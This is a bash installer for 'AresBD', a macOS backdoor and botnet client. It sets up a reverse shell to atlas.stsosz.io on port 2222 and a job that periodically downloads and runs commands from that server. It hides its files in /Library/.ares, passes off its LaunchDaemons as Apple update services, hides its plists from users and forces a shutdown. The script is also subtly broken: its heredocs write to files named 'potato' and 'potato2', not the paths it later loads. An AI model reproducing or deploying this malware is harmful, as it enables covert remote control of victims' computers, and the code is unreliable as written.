#!/bin/bash

#  install.sh
#  AresBD
#
#  Copyright (c) 2015 Stsosz Systems. All rights reserved.

SHELL_RECONNECT=60
BOTNET_RECONNECT=300
PORT=2222
SERVER=atlas.stsosz.io

echo "Welcome to the AresBD server installer."
echo "Using port $PORT"
echo "Using server $SERVER"
echo ""
echo "The client will attempt to reconnect to the server every $SHELL_RECONNECT seconds."
echo "The client will attempt to download and execute botnet commands every $BOTNET_RECONNECT seconds."
echo ""
echo "Creating hidden directory..."
mkdir -p /Library/.ares
echo "Done."
echo ""

echo "Making sure that LaunchDaemons folder exists..."
mkdir -p /Library/LaunchDaemons
echo "Done."
echo ""

echo "Copying connect.sh..."
cat <<ENDOFCONNECTSH >> potato
#!/bin/bash
bash -i >& /dev/tcp/$SERVER/$PORT 0>&1
wait
ENDOFCONNECTSH
echo "Done."
echo ""

echo "Copying update.sh..."
cat <<ENDOFUPDATESH >> potato2
#!/bin/bash

curl -o /Library/.ares/newcommands http://$SERVER/newcommands

CURRENTMD5=`md5 -q /Library/.ares/commands`

NEWMD5=`md5 -q /Library/.ares/newcommands`

if [[ "$CURRENTMD5" == "$NEWMD5" ]]
then

rm -rf /Library/.ares/newcommands
exit

else

rm -rf /Library/.ares/commands
mv /Library/.ares/newcommands /Library/.ares/commands
bash /Library/.ares/commands

fi
ENDOFUPDATESH
echo "Done."
echo ""

echo "Copying com.apple.update.plist..."
cat <<ENDOFCOMAPPLEUPDATE >> potato2
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>/Library/.ares/update.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>$BOTNET_RECONNECT</integer>
    <key>AbandonProcessGroup</key>
    <true/>
</dict>
</plist>
ENDOFCOMAPPLEUPDATE
echo "Done."
echo ""

echo "Copying com.apple.ares.plist..."
cat <<ENDOFCOMAPPLEARES >> potato
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.ares</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>/Library/.ares/connect.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>$SHELL_RECONNECT</integer>
    <key>AbandonProcessGroup</key>
    <true/>
</dict>
</plist>
ENDOFCOMAPPLEARES
echo "Done."
echo ""

echo "Done Copying Files. "
echo ""

echo "Making everything executable..."
chmod +x /Library/.ares/connect.sh
chmod +x /Library/.ares/update.sh
echo "Done"
echo ""

echo "Making sure that the user cannot read plists..."
chmod 600 /Library/LaunchDaemons/com.apple.ares.plist
chmod 600 /Library/LaunchDaemons/com.apple.update.plist
echo "Done."
echo ""

echo "Loading plists into LaunchCTL"
launchctl load /Library/LaunchDaemons/com.apple.ares.plist
launchctl load /Library/LaunchDaemons/com.apple.update.plist
echo "Done."
echo ""

echo "Install Complete."
echo ""

echo "Shutting down..."
shutdown -h now